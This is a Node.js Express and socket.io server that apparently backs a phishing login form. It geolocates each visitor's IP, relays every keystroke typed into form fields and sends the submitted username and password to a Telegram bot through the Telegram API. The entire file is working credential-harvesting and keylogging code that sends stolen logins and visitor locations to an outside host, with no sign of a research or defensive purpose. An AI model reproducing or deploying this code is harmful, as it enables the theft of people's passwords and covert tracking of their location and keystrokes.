const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const axios = require("axios");

const app = express();
const server = http.createServer(app);

const io = new Server(server,{
  cors:{origin:"*"}
});

app.use(cors());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

function sendTelegram(message){
    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        chat_id: CHAT_ID,
        text: message
    });
}

async function getLocation(ip){
    try{
        const res = await axios.get(`https://ipapi.co/${ip}/json/`);

        const city = res.data.city || "Unknown";
        const region = res.data.region || "Unknown";
        const country = res.data.country_name || "Unknown";

        return `${city}, ${region}, ${country}`;
    }catch{
        return "Unknown location";
    }
}

io.on("connection", async (socket)=>{

    console.log("User opened the form");

    let ip =
        socket.handshake.headers["x-forwarded-for"] ||
        socket.handshake.address;

    if (ip && ip.includes(",")) {
        ip = ip.split(",")[0];
    }

    if (ip) {
        ip = ip.replace("::ffff:", "");
    }

    const location = await getLocation(ip);

    console.log("IP:", ip);
    console.log("Location:", location);

    sendTelegram(`⚠️ New Visitor on Your Site\nIP: ${ip}\nLocation: ${location}`);

    socket.on("typing",(data)=>{
        sendTelegram(`Typing\nField: ${data.field}\nValue: ${data.value}`);
    });

    socket.on("submit",(data)=>{
        sendTelegram(`✅ Final Submission\nUsername: ${data.username}\npassword: ${data.password}`);
    });

});

server.listen(3000,()=>{
    console.log("Server running on port 3000");
});
